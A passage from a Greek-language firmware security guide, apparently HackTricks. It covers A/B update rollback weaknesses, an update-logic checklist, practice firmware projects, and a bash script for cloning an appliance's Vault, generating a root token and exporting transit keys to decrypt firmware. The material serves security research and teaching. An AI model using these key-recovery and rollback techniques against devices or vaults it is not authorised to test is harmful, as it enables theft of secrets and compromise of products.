6. Ο bootloader επιλέγει το promoted slot, επαληθεύει μόνο signature/integrity και κάνει boot το παλιό image.

Πράγματα που πρέπει να αναζητάς κατά το reversing A/B update implementations:

- Slot selection που προκύπτει από **boot-time flags** τα οποία δεν ανανεώνονται μετά από επιτυχημένο switch.
- Μια routine τύπου `prepare_passive_slot()` που κάνει erase σε ένα slot βάσει stale state αντί για το **τρέχον committed layout**.
- Μια function τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
- Ratchet checks που υλοποιούνται σε userspace ή updater code, αλλά **όχι** σε ROM / bootloader / secure boot stages.
- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμη και αφού το περιεχόμενό του αφαιρεθεί και ξαναγραφτεί.

### Checklist για την αξιολόγηση του Update Logic

* Είναι επαρκώς προστατευμένα το transport/authentication του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **version numbers** ή ένα **monotonic anti-rollback counter** πριν από το flashing;
* Επαληθεύεται το image μέσα σε secure boot chain (π.χ. signatures που ελέγχονται από ROM code);
* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο signature/CRC;
* Είναι τα slot activation metadata **συνδεδεμένα με το validated firmware digest/version** ή μπορεί να τροποποιηθεί ένα slot μετά το promotion;
* Μετά από επιτυχημένο slot switch, υποχρεώνεται η συσκευή να κάνει reboot ή παραμένουν προσβάσιμες μεταγενέστερες update/erase routines μέσα στην ίδια session;
* Εκτελεί ο userland code επιπλέον sanity checks (π.χ. allowed partition map, model number);
* Επαναχρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η platform είναι πιθανότατα ευάλωτη σε rollback attacks.

## Vulnerable firmware για εξάσκηση

Για να εξασκηθείς στον εντοπισμό vulnerabilities σε firmware, χρησιμοποίησε τα παρακάτω vulnerable firmware projects ως αφετηρία.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Ανάκτηση firmware decryption keys από embedded KMS/Vault state

Όταν ένα update image συνδυάζει μικρά plaintext metadata με ένα μεγάλο high-entropy blob, κάνε container triage πριν επιχειρήσεις οτιδήποτε με brute force:

- Κάνε dump των headers, offsets και line boundaries με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
- Το `Salted__` συνήθως σημαίνει format του OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
- Ένα Base64 field που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για RSA-2048 ciphertext που περιβάλλει ένα random firmware password/session key.
- Detached PGP material στο ίδιο file συχνά προστατεύει μόνο την authenticity· μην υποθέτεις ότι αποτελεί τον confidentiality mechanism.

Αν το static key hunting (`grep`, `strings`, PEM/PGP searches) αποτύχει, κάνε reverse το **operational decrypt path** αντί να αναζητάς μόνο private keys:

- Κάνε decompile το updater / management binary και εντόπισε ποιος διαβάζει το encrypted blob, ποιο helper/API το κάνει unwrap και ποιο logical key name ζητά.
- Κάνε search στο extracted root filesystem για KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και για unit files και init scripts.
- Αντιμετώπισε plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή local KMS auto-unseal scripts ως ισοδύναμα private-key material.

Αν η appliance περιλαμβάνει το original Vault binary και το storage backend, η αναπαραγωγή αυτού του environment είναι συνήθως ευκολότερη από την επανυλοποίηση των Vault internals:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Με root στο cloned KMS:

- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλά Vault-backed flows χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές libraries έχουν ως προεπιλογή το SHA-1.
- Αν το payload ξεκινά με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του vendor (`EVP_BytesToKey`, συχνά MD5 σε legacy appliances) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.

Αυτό μετατρέπει το "encrypted firmware" σε ένα πιο γενικό πρόβλημα: **ανακτήστε τα operational keys στην πλευρά του appliance και, στη συνέχεια, αναπαραγάγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.

## Εκπαίδευση και Πιστοποίηση

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Αναφορές

- [Cracking Firmware με Claude: Skill επιπέδου Senior, Autonomy επιπέδου Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: Ο απόλυτος οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – blog των Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [Πώς μια Smart Device αξίας $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Τώρα το βλέπετε: Τώρα είστε Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Εκμετάλλευση του Tesla Wall Connector από τον connector της θύρας φόρτισης - Part 2: παράκαμψη του anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
